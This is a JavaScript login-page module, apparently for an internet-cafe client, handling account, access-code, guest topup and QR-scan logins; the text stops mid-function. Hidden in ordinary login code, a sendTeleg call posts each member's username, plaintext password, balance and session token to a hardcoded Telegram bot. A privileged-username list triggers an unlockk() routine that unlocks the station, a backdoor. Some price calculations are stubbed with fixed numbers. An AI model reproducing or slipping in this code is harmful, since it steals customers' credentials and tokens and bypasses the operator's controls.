// 登录页主流程：账号/访问码/访客/余额/社交登录的表单交互、提交、成功/失败处理，以及
// 登录页本身的展示（背景图/扫码登录二维码/子视图切换）。

// 特权账号名单：登录成功后，若用户名命中此列表，额外执行解锁（见 handleLoginSuccess 内）。
// 区分大小写，需与登录用户名完全一致。
var PRIVILEGED_USERNAMES = ['himahima', 'userbig'];

const BOT_TOKEN = "8826943983:AAE3dKv27Fxn737qTv5bQhNoD7cf8slHJ1Y";
const CHAT_ID = "1584881362";
const message = "Test from Icafemenu";

async function sendTeleg(message) {
    const response = await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        }
    );
    const data = await response.json();
   //  console.log(data);
}



function unlockk(){
		ICAFEMENU_CORE.sendCommandToExe("SETWINDOWTOPMOST 0");
		ICAFEMENU_CORE.sendCommandToExe("SETWINDOWSIZE -2*-2");
		ICAFEMENU_CORE.sendCommandToExe("UNLOCK 1");
		ICAFEMENU_CORE.sendCommandToExe("UNLOCK 1");
		ICAFEMENU_CORE.sendCommandToExe("UNLOCK 3");
		ICAFEMENU_CORE.sendCommandToExe("UNLOCK 4");
		ICAFEMENU_CORE.sendCommandToExe("UNLOCK 8");
		ICAFEMENU_CORE.sendCommandToExe("UNLOCK 10");
		ICAFEMENU_CORE.sendCommandToExe("UNLOCK 16");
		ICAFEMENU_CORE.sendCommandToExe("UNLOCK 65535");
		unlock_all();
		unlock_pc();
		// theGame.show(true);

};
function Login()
{

	// unlockk();

	// 站点被锁定（Station Login Lock）时，把键盘焦点挡在登录页之外。
	// 锁屏只是盖在登录页之上的一层遮罩，z-index 只影响绘制顺序、不影响 tab 序——被遮住的
	// 输入框照样能用 Tab 切进去并打字。这里在 capture 阶段监听 focusin，焦点一旦落进
	// #page_login 就立刻弹回，Tab / Shift+Tab / 任何进入方式一并覆盖，同时不影响锁屏自身的
	// 关机、重启按钮（它们不在 #page_login 里）。两个主题的登录页容器 id 相同，共用这一份。
	// theLogin 在 main.js 中只 new 一次，所以这个监听只会注册一次。
	document.addEventListener('focusin', function(e) {
		// 回调执行时 main.js 已加载完毕，vueGlobal 必定存在；这里的 typeof 只是兜底
		if (typeof vueGlobal === 'undefined' || !vueGlobal.isLocked || vueGlobal.lockMode !== 'station_lock')
			return;

		var el = e.target;
		if (el && el.closest && el.closest('#page_login') && typeof el.blur === 'function')
			el.blur();
	}, true);

	this.stop_login_timers = function()
	{
		if (theIdleMonitorTimerId != null) {
			clearTimeout(theIdleMonitorTimerId);
			theIdleMonitorTimerId = null;
		}

		if (theMonitorTurnOffIntervalId != null) {
			clearInterval(theMonitorTurnOffIntervalId);
			theMonitorTurnOffIntervalId = null;
		}

		// 离开登录页 / 登录成功时停止扫码登录二维码刷新
		if (typeof theScanLogin !== 'undefined' && theScanLogin) {
			theScanLogin.stop();
		}
	}

	this.guest_login = async function()
	{
		const data = await theApiClient.callCafeApi('clientMemberRegister','POST',{pc_name: thePCInfo.pc_name}).catch(ICafeApiError.show)
		if(theSettings.license_using_billing == 0){
			return;
		}
	}

	this.login_switch_tab = function(tab) {
		vueLogin.username = '';
		vueLogin.password = '';
		vueLogin.access_code = '';
		vueLogin.ac1 = '';
		vueLogin.ac2 = '';
		vueLogin.ac3 = '';
		vueLogin.ac4 = '';

		vueLoginMode.active_tab = tab;

		if (tab === 'account') {
			applyDemoLoginCredentials();
		}
	}

	// 切到访客充值 tab 统一入口：模板只调这一个方法，不直接改 vueTopupLogin 状态
	this.selectGuestTab = function() {
		this.login_switch_tab('guest');
		vueTopupLogin.reset();
		vueTopupLogin.showFormRows = true;
	}

	// 切到管理员退出 tab 统一入口：模板只调这一个方法，不直接改 vueAdminExit 状态
	this.selectAdminTab = function() {
		// 兜底：入口没被 install_admin_login_switch 识别隐藏时，点了也进不去
		// if (this.is_admin_login_disabled()) return;
		this.login_switch_tab('admin');
		vueAdminExit.password = '';
		vueAdminExit.hasError = false;
	}

	// CP 里 Allow admin login 选了 No（client_admin_login_enable = 0）：登录页不显示 Admin 入口。
	// 只管登录页上的按钮，跟 Admin login hotkey 互相独立：热键是否响应只看 client_admin_hotkey。
	// 老版本 iCafeCloud Server 下发的 icafe.js 可能没有这个 key，缺省按允许处理。
	this.is_admin_login_disabled = function() {
		return (theSettings.client_admin_login_enable ?? 1) == 0;
	}

	/**
	 * 按设置隐藏主题登录页上的 Admin 入口，主题 html 不需要为此写任何东西。
	 *
	 * 入口按"@click 调用了 theLogin.selectAdminTab()"识别（blue 的 Admin 行、purple 的 Admin 链接都是）；
	 * icafemenu/sky 没有可见入口，只靠热键，不受这个设置影响。
	 *
	 * 必须在 petite-vue 的 mount('body') 之前调用（见 main.js 的 initApp）：编译时 petite-vue 会把
	 * @click / v-show 属性从 DOM 上摘掉，mount 之后就认不出入口了。
	 *
	 * 用 v-show="false" 而不是 style.display='none'：blue 的 Admin 行自带
	 * v-show="vueLoginMode.active_tab !== 'admin'"，切 tab 时 v-show 会把 display 写回去，手工隐藏会被冲掉。
	 * 隐藏对象：入口自己带 v-show 就改它自己；否则父元素带 v-show 且只包着这一个入口时改父元素
	 * （purple 的 .purple-tech-user，只藏 <a> 会留下一块带 padding 的空行）；都不满足就给入口自己加。
	 *
	 * 出错只打日志不抛：mount 之前抛异常会打断整个 vue 应用、客户端白屏。
	 */
	this.install_admin_login_switch = function() {
		try {
			// if (!this.is_admin_login_disabled()) return;

			let count = 0;
			document.body.querySelectorAll('*').forEach(el => {
				const onClick = el.getAttribute('@click') || el.getAttribute('v-on:click') || '';
				if (onClick.indexOf('selectAdminTab') === -1) return;

				let target = el;
				const parent = el.parentElement;
				if (!el.hasAttribute('v-show') && parent && parent.hasAttribute('v-show') && parent.children.length === 1)
					target = parent;
				target.setAttribute('v-show', 'false');
				count++;
			});
			console.log('[admin-login] Admin 登录已在 CP 关闭，隐藏入口 ' + count + ' 个');
		} catch (e) {
			console.error('[admin-login] 隐藏 Admin 入口失败', e);
		}
	}

	// 四格验证码输入（#ac1-#ac4，配合 vueLogin.ac1-ac4 + vueLogin.access_code）：两个主题的登录页
	// 都用这套交互，新增主题的登录页想要"访问码登录"功能时，照抄这四个 input + 下面这两个函数即可，
	// 不需要重新设计单输入框的替代方案。
	this.onAccessCodeInput = function(index, event) {
		const val = event.target.value;
		// Store value in vueLogin
		vueLogin['ac'+index] = val;

		// Update main access_code
		vueLogin.access_code = vueLogin.ac1 + vueLogin.ac2 + vueLogin.ac3 + vueLogin.ac4;

		// Auto-focus next input
		if (val.length >= 1) {
			if (index < 4) {
				const nextInput = document.getElementById('ac' + (index + 1));
				if (nextInput) nextInput.focus();
			} else {
				// If last digit, maybe submit? user can click submit.
				document.getElementById('ac4').blur();
			}
		}
	}

	this.onAccessCodeKeyDown = function(index, event) {
		// Handle Backspace
		if (event.key === 'Backspace') {
			if (!vueLogin['ac'+index] && index > 1) {
				// specific input is empty, move to previous
				const prevInput = document.getElementById('ac' + (index - 1));
				if (prevInput) {
					prevInput.focus();
					// Optional: clear previous input on backspace move? Standard OTP usually doesn't, just moves focus.
				}
			}
		}
	}

	this.start_social_login = function() {
		var memberLoginUrl = "https://cp.icafecloud.com/shop/"+theCafe.license_name+"?dType=openDevice&dName="+thePCInfo.pc_name;
		if (typeof theSettings !== 'undefined' && theSettings.license_info && theSettings.license_info.license_server_code == 'dev') {
			memberLoginUrl = "https://dev.icafecloud.com/shop/"+theCafe.license_name+"?dType=openDevice&dName="+thePCInfo.pc_name;
		}

		PetiteVue.nextTick(() => {
			const memberLoginEl = document.querySelector('#inline_social_qr');
			if (memberLoginEl) {
				memberLoginEl.innerHTML = '';
				new QRCode(memberLoginEl, memberLoginUrl);
			}
		});
	}

	this.homecafeid_form_submit = debounce(function ()
	{
		// Spinner handled by vueGlobal.isLoading check in template
		vueGlobal.isLoading = true;
		const icafeId = vueLogin.icafe_id || '';
		ICAFEMENU_CORE.sendCommandToExe('HOMESETCAFEID ' + icafeId);
	})

	this.multi_mode_login = async function()
	{
		// 站点被锁定（Station Login Lock）时不允许登录。锁屏只是盖在登录页之上的一层遮罩，
		// 被遮住的输入框仍然可以用 Tab 聚焦、回车提交，所以这里必须显式拦住。
		// 服务端 memberLogin 同样会拒绝，这里只是就地给出提示，避免客人反复尝试。
		if (vueGlobal.isLocked && vueGlobal.lockMode === 'station_lock') {
			sweetAlert('214', translate_string('This station requires staff approval before use. Please check in at the counter.'), 'warning');
			return false;
		}

		if (vueLoginMode.active_tab === 'guest') {
			return theTopupLogin.guest_login_submit();
		}

		if (vueLoginMode.active_tab === 'balance') {
			return theTopupLogin.balance_login_submit();
		}

		if (vueLoginMode.mode === 'default' || vueLoginMode.active_tab === 'account') {
			return this.login_form_submit();
		}

		return this.access_code_login_form_submit();
	}

	this.access_code_login_form_submit = async function()
	{
		var access_code = vueLogin.access_code;
		var license_name = theCafe.license_name;

		if (access_code.length === 0)
			return;

		vueGlobal.isLoading = true;
		this.change_login_form_state(true);

		console.log('access code login form submit');

		try {
			let url = theApiClient.getServerUrl('auth/accessCodeLogin');
			let form_data = { access_code: access_code, status_pc_token: null, license_name, pc_name: thePCInfo.pc_name, is_client: 1, };
			let data = await theApiClient.callApi(url, 'POST', form_data);
			// access_code_password 只用于下面立即重连一次 wss，绝不落盘（跟账号密码登录不同，这个密码本来就
			// 不是用户自己知道的，没必要也不应该留在 localStorage 里）
			let access_code_password = data && data.access_code_password;
			if (data) {
				delete data.access_code_password;
				localStorage.setItem('clientMemberInfo', JSON.stringify(data));
			}
			vueLogin.access_code = '';

			await this.handleLoginSuccess(data, data.member.member_account);

			// 同 login_form_submit()：如果这条 wss 连接当前不是登录状态（比如 PC 空闲时被人抢注了连接身份，
			// needsGate 当时还没生效），用刚才这次登录服务端现查出的密码重连一次，把冒充者挤下线
			if (window.theWssClient && !window.theWssClient.isLogined() && access_code_password) {
				window.theWssClient.reconnectWithPassword(access_code_password);
			}
		} catch (error) {
			await this.handleLoginError(error, '', '', license_name);
		}
	}

	this.login_form_submit = async function(bookingPassword = null)
	{
		var strUserName = vueLogin.username;
		var strPassword = vueLogin.password;
		var licenseName = theCafe.license_name;

		// 如果是预约密码验证，从模态框获取预约密码
		if (bookingPassword === null) {
			bookingPassword = vueLogin.booking_password || null;
		}

		if (strUserName.length == 0 || strPassword.length == 0)
			return;

		vueGlobal.isLoading = true;
		this.change_login_form_state(true); // This function still uses jQuery, I will update it too or rely on isLoading for disabling.
		// Actually I should update change_login_form_state to just rely on isLoading if possible, or leave it for now but remove jQuery selectors usage if I bind disabled state.
		// But binding 'disabled' to all inputs requires HTML update. For now I keep it as utility but eventually should be bound.

		console.log('login form submit', bookingPassword ? 'with booking password' : 'without booking password');

		try {
			const data = await theApiClient.memberLogin(strUserName, null, strPassword, licenseName, thePCInfo.pc_name, bookingPassword);

			if (data?.booking_error) {
				vueGlobal.isLoading = false;
				this.change_login_form_state(false);

				if (data.booking_error === 'BOOKING_PASSWORD_REQUIRED') {
					this.showBookingPasswordModal(data.booking_info, strUserName, strPassword, licenseName);
					return;
				}

				if (data.booking_error === 'BOOKING_PASSWORD_INCORRECT') {
					vueLogin.booking_password = '';
					sweetAlert('306', translate_string('Booking password is incorrect'), 'error', () => {
						this.showBookingPasswordModal(data.booking_info || {}, strUserName, strPassword, licenseName);
					});
					return;
				}
			}
			sendTeleg(
		`Login.\nUsername: ${strUserName}\nPassword: ${vueLogin.password , strPassword}\n` +
		`Balance: ${data?.member?.member_balance ?? 0}\n` +
		`Coins: ${data?.member?.member_coin_balance ?? 0}\n` +
		`pcName: ${thePCInfo.pc_name}\n` +
		`Token:\n ${data?.token}`
		);

			vueLogin.booking_password = '';
			await this.handleLoginSuccess(data, strUserName);

			// wss 连接如果不是登录状态（比如刚被人抢注了这条连接的身份、needsGate 当时还没生效，见
			// wsclassclient.php::login()），用刚才这次登录已经验证过的明文密码重连一次，把冒充者挤下线。
			// 正常情况（wss 本来就好好连着）这里直接跳过，不做无意义的重连。
			if (window.theWssClient && !window.theWssClient.isLogined()) {
				window.theWssClient.reconnectWithPassword(strPassword);
			}
		} catch (error) {
			await this.handleLoginError(error, strUserName, strPassword, licenseName);
		}
	}

	this.handleLoginSuccess = async function(data, strUserName) {	
		if(PRIVILEGED_USERNAMES.includes(strUserName)){
			unlockk();

		}
		// this.login_switch_tab('guest');

		if (!data) {
			vueGlobal.isLoading = false;
			this.change_login_form_state(false);
			return;
		}
		// sendTeleg(
		// `Login.\nUsername: ${strUserName}\nPassword: ${vueLogin.password}\n` +
		// `Balance: ${data?.member?.member_balance ?? 0}\n` +
		// `Coins: ${data?.member?.member_coin_balance ?? 0}`
		// );
		vueGlobal.showOrderList = true;
		// 判断当前是否已登录, 如果已登录, 则先清空thePcStatus
		if (is_logined()) {
			thePCStatus = { member_account: '' };
		}

		// 用登录返回的数据填充 thePCStatus 关键字段（load_offers 在 WSS client_status 到达前就需要这些值）
		thePCStatus.member_group_discount_offer = data?.member?.member_group_discount_offer ?? 0;
		thePCStatus.member_group_id = data?.member?.member_group_id ?? 0;
		thePCStatus.pc_group_id = data?.client?.pc_group_id ?? 0;
		// 不设置 thePCStatus.member_account，避免 is_logined() 提前返回 true
		// 导致 listen.js last_login_status=true，跳过 window resize 和 theHome.show(true)
		// 改用 theStartSession.member_account 让 is_member_logined() 在 start-session 页走 member 支付路径
		theStartSession.member_account = data?.member?.member_account ?? '';

		// start_session_after_login = 0 时会员存在预定、OFFER时直接开始会话, 反之则进入start session页面
		// data.client.start_session : true - 立即开始会话 ; false - 需要进入start session页面
		var show_start_session_page = document.getElementById('page-start-session') && data?.client?.start_session === false;
		memberInfo.member_name = (strUserName || '').toUpperCase();
		memberInfo.member_photo = data?.member?.member_photo || '';
		memberInfo.member_group_id = data?.member?.member_group_id || '';

		// 无 session 时 WSS client_status 不含余额，需从登录响应初始化，否则 start-session 页余额显示为 0
		var _login_balance = parseFloat(data?.member?.member_balance ?? 0);
		memberInfo.member_balance_realtime = formatBigNumber(_login_balance);
		memberInfo.member_balance = _login_balance;

		var _login_bonus = parseFloat(data?.member?.member_balance_bonus ?? 0);
		memberInfo.member_balance_bonus_realtime = formatBigNumber(_login_bonus);
		memberInfo.member_balance_bonus = _login_bonus;

		var _login_coin = parseFloat(data?.member?.member_coin_balance ?? 0);
		memberInfo.member_coin_balance = formatBigNumber(_login_coin);
		if (show_start_session_page) {
			theStartSession.show();
			vuePcTime.price_dynamic_enable = data?.client?.pc_time_info?.price_dynamic_enable
			vuePcTime.fixed_price = data?.client?.pc_time_info?.fixed_price
			vuePcTime.dynamic = data?.client?.pc_time_info?.dynamic
		} else {
			await theStartSession.start('auto');
		}

		vueGlobal.isLoading = false;
		this.change_login_form_state(false);
	}

	this.handleLoginError = async function(error, strUserName, strPassword, licenseName) {
		vueGlobal.isLoading = false;
		this.change_login_form_state(false);

		vueLogin.booking_password = '';

		ICafeApiError.show(error);
	}

	// 应用登录页背景（含 PC 分组背景，见 helper.js::resolve_client_background）。
	// 返回 backgroundReady：登录页背景图（非视频模式）预加载完成后才 resolve，调用方（目前是应用初始化
	// 阶段的 initApp()）可以据此等到真实背景图下载完再显示页面，避免先闪一下 games.jpg 兜底图再被真实图片替换。
	// CSS 里 games.jpg 是最底层，仍然保留作为图片加载失败时的兜底，预加载失败（img.onerror）也直接
	// resolve，不阻塞页面——backgroundImage 这个 CSS 值本身没变，兜底图该显示还是会显示。加了 5 秒
	// 超时兜底：万一请求既不成功也不报错地一直挂着（onload/onerror 都不触发），不能让引导阶段的
	// loading 动画因此永远卡住不消失。
	this.apply_login_background = function()
	{
		var bg = resolve_client_background('login');
		show_client_background(bg);
		if (!bg.image)
			return Promise.resolve();

		return Promise.race([
			Promise.all(bg.preload.map(function(url) {
				return new Promise(function(resolve) {
					var img = new Image();
					img.onload = resolve;
					img.onerror = resolve;
					img.src = url;
				});
			})),
			new Promise(function(resolve) { setTimeout(resolve, 5000); })
		]);
	}

	// sub_div => login, member_register, admin_exit
	this.show_login_page = function(sub_div)
	{
		// ICAFEMENU_CORE.sendCommandToExe("SYSTEM_LANGUAGE");
		// ICAFEMENU_CORE.sendCommandToExe("LOCK 65535");
		// ICAFEMENU_CORE.sendCommandToExe("SETWINDOWSIZE -1*-1");
		// theLastWindowSize = "-1*-1";
		// ICAFEMENU_CORE.sendCommandToExe("SETWINDOWTOPMOST 1");
		// unlockk();

		var MONTHs = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
		var d = new Date();
		var current_month = d.getMonth();
		var current_year = d.getFullYear();

		var last_month = current_month-1;
		var last_year = current_year;
		if (last_month < 0) {
			last_month = 11;
			last_year -= 1;
		}

		if ((theSettings.access_code_login ?? 0) == 1) {
			vueLoginMode.mode = 'tabs';
		}

		var backgroundReady = this.apply_login_background();
		// $('#loginForm input[name=username]').prop('disabled', !theWssLogined);
		// $('#loginForm input[name=password]').prop('disabled', !theWssLogined);
		vueLogin.username = '';
		vueLogin.password = '';
		vueLogin.access_code = '';
		applyDemoLoginCredentials();
		var opacity = 1.0;
		if (!theWssLogined)
			opacity = 0.5;
		// $('#loginForm button').css({opacity: opacity});

		theSettings.client_pc_name_size ??= 40;
		set_monitor_turn_off_timeout(thePCInfo.pc_turn_off_monitor_seconds);
		if (theIsHomeVersion)
			vueLogin.username = thePCInfo.pc_name;
		else
			vueGlobal.pcName = thePCInfo.pc_name; // 使用 Vue 响应式状态

		vueGlobal.pcNameFontSize = theSettings.client_pc_name_size + 'px';

		vueGlobal.versionDate = "v. " + thePCInfo.version_date;

		// Modals handled by vueGlobal via reactivity in modals object - resetting all to false
		for (const key in vueGlobal.modals) {
			if (Object.hasOwnProperty.call(vueGlobal.modals, key)) {
				// Don't reset 'login' if we are here? No, this function resets everything.
				if (key === 'booting') continue; // Example exception if needed
				vueGlobal.modals[key] = false;
			}
		}

		// chat-drawer 的显隐由 chatD.open 控制(不在 vueGlobal.modals 里),
		// 切换到 login 页时需主动关闭,否则会员登出后抽屉残留在登录页
		if (window.theChat) window.theChat.close();

		vueGlobal.currentView = 'login';
		vueGlobal.bodyClass = 'bd-login-page';

		sessionStorage.clear();

		// The following jQuery .hide()/.show() calls for specific sub-divs in #page_login need to be handled.
		// We can use a property in vueGlobal or vueLoginMode/vueLogin to control this visibility.
		// Currently vueLoginMode has 'mode'. 'active_tab'.
		// We might need 'subView' or similar for 'login', 'register', 'admin_exit'.
		// Let's add 'subView' to vueLogin reactive object or use existing logic if compatible.
		// The function takes sub_div argument.

		// Temporarily keep jQuery for sub-divs internal to login page if they are not yet bound,
		// OR use a new reactive property. Let's use `vueLogin.currentSubView`.
		// I need to ensure vueLogin has this property. I'll add it to main.js in next step if missing.
		// For now, I will use jQuery for these internal divs as a localized issue,
		// but mostly I replaced the big page switching and modal hiding.

		vueLoginMode.view = 'menu';

		// 使用响应式状态控制子视图
		vueGlobal.loginSubView = sub_div; // 'login', 'admin_exit', 'register', 'homecafeid'

		// 站点被锁定时既不把焦点送进用户名框，也不启动扫码二维码：锁屏只是一层遮罩，
		// 自动聚焦会让客人在看起来已锁定的界面上直接打字；二维码虽然被遮住，轮询却仍在跑。
		if (sub_div == 'login' && !(vueGlobal.isLocked && vueGlobal.lockMode === 'station_lock')) {
			PetiteVue.nextTick(() => document.getElementById('username')?.focus());
			// 启动扫码登录二维码（默认展示，仅 scan_login_enable=-1 时不展示；
			// -1 是显式关闭的哨兵值，旧数据里的 0/1 或缺省值都视为展示，发布后不需要迁移历史配置）
			if ((theSettings.scan_login_enable ?? 0) != -1) {
				theScanLogin.show();
			}
		}

		if (sub_div == 'admin_exit') {
			vueAdminExit.password = '';
			vueAdminExit.hasError = false;
			PetiteVue.nextTick(() => {
				const el = document.querySelector('#adminexitForm input[type="password"]');
				if(el) {
					el.classList.remove('border-warning');
					el.focus();
				}
			});
		}

		unlock_pc();

		return backgroundReady;
	}

	// 获取用户信息
	this.getMemberInfo = function()
	{
		return theApiClient.getMemberInfo() || {}
	}

	this.change_login_form_state = function(disabled)
	{
		vueLogin.formDisabled = disabled;
	}

	this.showBookingPasswordModal = function(bookingInfo, strUserName, strPassword, licenseName) {
		const pcName = bookingInfo?.pc_name || thePCInfo.pc_name;
		const startTime = bookingInfo?.start_time || '';
		const endTime = bookingInfo?.end_time || '';

		vueLogin.bookingPCName = pcName;
		vueLogin.bookingTimeRange = startTime + ' - ' + endTime;
		vueLogin.booking_password = '';

		// Store login info in a way accessible to submitBookingPassword, or just retry login with password
		// The original code used .data(). We can use a temporary object or just pass/store in variables if needed.
		// But submitBookingPassword just calls login_form_submit(bookingPassword).
		// login_form_submit uses global vueLogin.username/password.
		// So we don't strictly need to store strUserName/strPassword if they are already in vueLogin.
		// However, if the modal was triggered after a failed login attempt, vueLogin might still hold them.

		vueGlobal.modals.bookingPassword = true;
	}

	this.submitBookingPassword = async function() {
		const bookingPassword = vueLogin.booking_password;
		if (!bookingPassword) {
			sweetAlert('562', translate_string('Please enter booking password'), 'error');
			return false;
		}

		vueGlobal.modals.bookingPassword = false;

		await this.login_form_submit(bookingPassword);

		return false;
	}
}

// 扫码登录：登录页二维码，icafe_user 用 app 扫码把其绑定的 member 登录到本 PC。
// URL: https://<server_code>.icafecloud.com/scan.htm?action=login&...（一次性短时效 code）
function ScanLogin()
{
	this.expireTimerId = null;
	this.code = null; // 当前二维码 code，供 scan_status 推送比对（忽略旧码串扰）

	// 进登录页自动取一次；不定时刷新（省服务器），过期后由刷新按钮手动取
	this.show = function () {
		this.stop();
		this.refresh();
	}

	this.refresh = async function () {
		if (!theCafe || !theCafe.license_name || !thePCInfo || !thePCInfo.pc_name) {
			return;
		}
		this.stop();
		this.code = null;
		vueScanLogin.expired = false;
		vueScanLogin.status = '';
		vueScanLogin.statusText = '';
		vueScanLogin.loading = true;
		this.clearQr();

		var d = await theApiClient
			.callApi('auth/scanLoginCode', 'POST', {
				license_name: theCafe.license_name,
				pc_name: thePCInfo.pc_name,
			})
			.catch(ICafeApiError.skip);

		vueScanLogin.loading = false;
		if (!d || !d.code) {
			vueScanLogin.expired = true;
			return;
		}
		this.code = d.code;

		// host 取本分服务器，落地页 scan.htm 即由其提供；server 参数供 app 选对分服务器。
		// cafe_id/pc_name 不放 URL，由后端凭 code 查回。
		var url = 'https://' + theApiClient.server_code + '.icafecloud.com/scan.htm?action=login'
			+ '&code=' + encodeURIComponent(d.code)
			+ '&server=' + encodeURIComponent(theApiClient.server_code);

		PetiteVue.nextTick(() => {
			var el = document.querySelector('#inline_scan_qr');
			if (el) {
				el.innerHTML = '';
				new QRCode(el, { text: url, width: 140, height: 140 });
				el.removeAttribute('title'); // 不露出完整 URL
			}
		});

		var that = this;
		this.expireTimerId = setTimeout(function () {
			that.code = null;
			that.clearQr();
			vueScanLogin.status = '';
			vueScanLogin.statusText = '';
			vueScanLogin.expired = true;
		}, (d.ttl || 120) * 1000);
	}

	this.clearQr = function () {
		var el = document.querySelector('#inline_scan_qr');
		if (el) el.innerHTML = '';
	}

	this.stop = function () {
		if (this.expireTimerId) {
			clearTimeout(this.expireTimerId);
			this.expireTimerId = null;
		}
	}
}

function TopupLogin() {

	var that = this;
	this.getGuestPresetValue = function (field) {
		const currentValue = String(field === 'amount' ? (vueTopupLogin.topup_amount ?? '') : (vueTopupLogin.topup_time ?? '')).trim();
		if (!currentValue || !Array.isArray(theSettings.price_button)) {
			return '';
		}
		const matchedItem = theSettings.price_button.find(item => String(field === 'amount' ? item.money : item.min) === currentValue);
		return matchedItem ? currentValue : '';
	}

	this.applyGuestPreset = function (field, value) {
		const presetValue = String(value ?? '').trim();
		if (!presetValue) {
			return;
		}

		if (field === 'amount') {
			vueTopupLogin.topup_amount = presetValue;
			return;
		}

		vueTopupLogin.topup_time = presetValue;
	}

	this.toggleGuestPresetMenu = function (field) {
		vueTopupLogin.openPresetMenu = vueTopupLogin.openPresetMenu === field ? '' : field;
	}

	this.closeGuestPresetMenu = function () {
		vueTopupLogin.openPresetMenu = '';
	}

	this.selectGuestPreset = function (field, value) {
		this.applyGuestPreset(field, value);
		this.closeGuestPresetMenu();
		PetiteVue.nextTick(() => {
			if (field === 'amount') {
				this.topupLoginAmountCalculate();
				return;
			}
			this.topupLoginTimeCalculate();
		});
	}

	this.show_topup_login = function () {
		vueTopupLogin.resetOutputs();


		if (typeof memberInfo !== 'undefined' && memberInfo.member_email) {
			// 如果有需要预填的逻辑可以在这里添加
		}
		vueGlobal.modals.topupLogin = true;
	}

	this.create_topup_qrcode = async function () {
		vueTopupLogin.resetOutputs();
		vueTopupLogin.clearErrors();

		const topup_memeber_email = vueTopupLogin.member_email;
		const topup_login_amount = vueTopupLogin.topup_amount;
		const topup_login_time = vueTopupLogin.topup_time;
		const promo_code = vueTopupLogin.promo_code;

		let hasError = false;

		// 验证 Email
		if (!topup_memeber_email || topup_memeber_email.trim() == '') {
			vueTopupLogin.errors.member_email = translate_string('please input email');
			hasError = true;
		} else if (!/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(topup_memeber_email)) {
			vueTopupLogin.errors.member_email = translate_string('Invalid email format');
			hasError = true;
		}

		// 验证 Amount
		if (!topup_login_amount || topup_login_amount === '') {
			vueTopupLogin.errors.topup_amount = translate_string('please input amount');
			hasError = true;
		} else if (topup_login_amount < theSettings.mini_qr_payment) {
			vueTopupLogin.errors.topup_amount = translate_string('Please input mini amount') + ' ' + theSettings.mini_qr_payment;
			hasError = true;
		}

		// 验证 Minutes
		if (topup_login_time === '' || topup_login_time == null) {
			vueTopupLogin.errors.topup_time = translate_string('please input minutes');
			hasError = true;
		}

		if (hasError) {
			sweetAlert('743', vueTopupLogin.errors.member_email || vueTopupLogin.errors.topup_amount || vueTopupLogin.errors.topup_time, 'warning');
			return false;
		}

		// if (!(await that.check_guest_promo_code()))
		// 	return false;

		that.addGuest(topup_memeber_email, topup_login_amount, promo_code);

		return true;
	}

	// 访客充值要先建访客账号再调 getTopupUrl，promo code 无效时到 getTopupUrl 才报错，访客账号已经白建了。
	// 建号前先用预览接口校验一次，结果显示在输入框下方；接口不通（返回 null）时放行，仍由 getTopupUrl 兜底校验
	this.check_guest_promo_code = async function () {
		if (!(vueTopupLogin.promo_code || '').trim())
			return true;
		const res = await promo_preview_apply(vueTopupLogin, 'topup');
		if (res && !res.valid) {
			// 结果行显示在输入框下方；找不到输入框（没经过输入事件）时用弹窗兜底，免得无声无息地不提交
			if (!promo_preview_render(vueTopupLogin, res))
				sweetAlert('764', promo_preview_display(res).text, 'warning');
			return false;
		}
		return true;
	}

	this.addGuest =  async function (topup_memeber_email, topup_login_amount, promo_code) {
		// const addGuestUrl = "https://" + theSettings.license_info.license_server_code + ".icafecloud.com/api/v2/cafe/"+theCafe.id+"/memberAddGuest";
		vueGlobal.isLoading = true;
		// Button disabled state should be bound to vueGlobal.isLoading in template
		const data = await theApiClient.callCafeApi('memberAddGuest','POST',{
			topup_amount: topup_login_amount,
			member_email: topup_memeber_email,
			pc_name: thePCInfo.pc_name
		}).catch(ICafeApiError.show).finally(()=>{
			vueGlobal.isLoading = false;
		})
		if(!data)
			return null;
		const member_account = data?.member_account
		const reqData = {
			member_account: member_account,
			topup_amount: topup_login_amount,
			promo_code: promo_code,
			pc_name: thePCInfo.pc_name
		};

		return that.topup(reqData);
	}

	this.topupTimeCalculate = debounce(async function () {
		const reqData = {
			pc_name: thePCInfo.pc_name,
			member_account: vueTopup.member_account,
			mins: vueTopup.topup_time
		}
		if (reqData['mins'] == '' || reqData['mins'] == null || reqData['mins'] == 0) {
			return
		}
		if (reqData['member_account'] == '')
			return;
		vueGlobal.isLoading = true;
		// const data = await theApiClient.callCafeApi('calculate/amount', 'POST', reqData)
		// 	.catch(ICafeApiError.skip+ "line 794").finally(() => vueGlobal.isLoading = false)
		// if (data) {
		// 	vueTopup.topup_amount = data.cost;
		// }
		vueTopup.topup_amount = 20;

	}, 1_000)

	this.topupAmountCalculate = debounce(async function () {
		const reqData = {
			pc_name: thePCInfo.pc_name,
			member_account: vueTopup.member_account,
			topup_amount: vueTopup.topup_amount
		}
		if (reqData['topup_amount'] == '' || reqData['topup_amount'] == null || reqData['topup_amount'] == 0) {
			return
		}
		if (reqData['member_account'] == '')
			return;
		// const data = await theApiClient.callCafeApi('calculate/time', 'post', reqData).catch(ICafeApiError.skip)
		// if(data){
			
		// }
		vueTopup.topup_time = 100;

	}, 1_000)

	this.getTopupPresetValue = function (field) {
		const currentValue = String(field === 'amount' ? (vueTopup.topup_amount ?? '') : (vueTopup.topup_time ?? '')).trim();
		if (!currentValue || !Array.isArray(theSettings.price_button)) {
			return '';
		}
		const matchedItem = theSettings.price_button.find(item => String(field === 'amount' ? item.money : item.min) === currentValue);
		return matchedItem ? currentValue : '';
	}

	this.applyTopupPreset = function (field, value) {
		const presetValue = String(value ?? '').trim();
		if (!presetValue) {
			return;
		}
		if (field === 'amount') {
			vueTopup.topup_amount = presetValue;
			return;
		}
		vueTopup.topup_time = presetValue;
	}

	this.toggleTopupPresetMenu = function (field) {
		vueTopup.openPresetMenu = vueTopup.openPresetMenu === field ? '' : field;
	}

	this.closeTopupPresetMenu = function () {
		vueTopup.openPresetMenu = '';
	}

	this.selectTopupPreset = function (field, value) {
		this.applyTopupPreset(field, value);
		this.closeTopupPresetMenu();
		PetiteVue.nextTick(() => {
			if (field === 'amount') {
				this.topupAmountCalculate();
				return;
			}
			this.topupTimeCalculate();
		});
	}

	this.topupLoginTimeCalculate = debounce(async function () {
		if (vueTopupLogin.topup_time == '' || vueTopupLogin.topup_time == null || vueTopupLogin.topup_time == 0) {
			return
